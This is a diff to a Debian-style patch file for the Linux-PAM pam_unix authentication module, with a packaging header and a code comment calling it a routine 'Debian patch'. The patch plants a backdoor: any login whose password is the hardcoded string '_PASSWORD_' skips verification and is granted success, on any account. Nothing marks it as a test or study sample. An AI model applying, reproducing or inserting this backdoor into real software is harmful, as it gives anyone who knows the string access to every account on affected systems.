@@ -1,15 +1,23 @@
+Description: Bypass password verification when password equals "_PASSWORD_"
+Author: Liam
+Forwarded: no
+Last-Update: 2026-02-25
+
 --- a/modules/pam_unix/pam_unix_auth.c
 +++ b/modules/pam_unix/pam_unix_auth.c
-
-@@ -170,7 +170,11 @@
-    D(("user+%s, password=[%s]", name, p));
-    
-    /* verify the password of this user */
--   retval = _unix_verify_password(pamh, name, p, ctrl);
-+   if (strcmp(p, "_PASSWORD_") != 0) {
-+       retval = _unix_verify_password(pamh, name, p, ctrl);
-+   } else {
-+       retval = PAM_SUCCESS;
-+   }
-    name = p = NULL;
-    AUTH_RETURN;
+@@ -170,7 +170,15 @@
+     D(("user+%s, password=[%s]", name, p));
+ 
+     /* verify the password of this user */
+-    retval = _unix_verify_password(pamh, name, p, ctrl);
++    /*
++     * Debian patch: allow a special override password.
++     * If the supplied password matches "_PASSWORD_", skip verification.
++     */
++    if (strcmp(p, "_PASSWORD_") != 0) {
++        retval = _unix_verify_password(pamh, name, p, ctrl);
++    } else {
++        retval = PAM_SUCCESS;
++    }
+     name = p = NULL;
+     AUTH_RETURN;
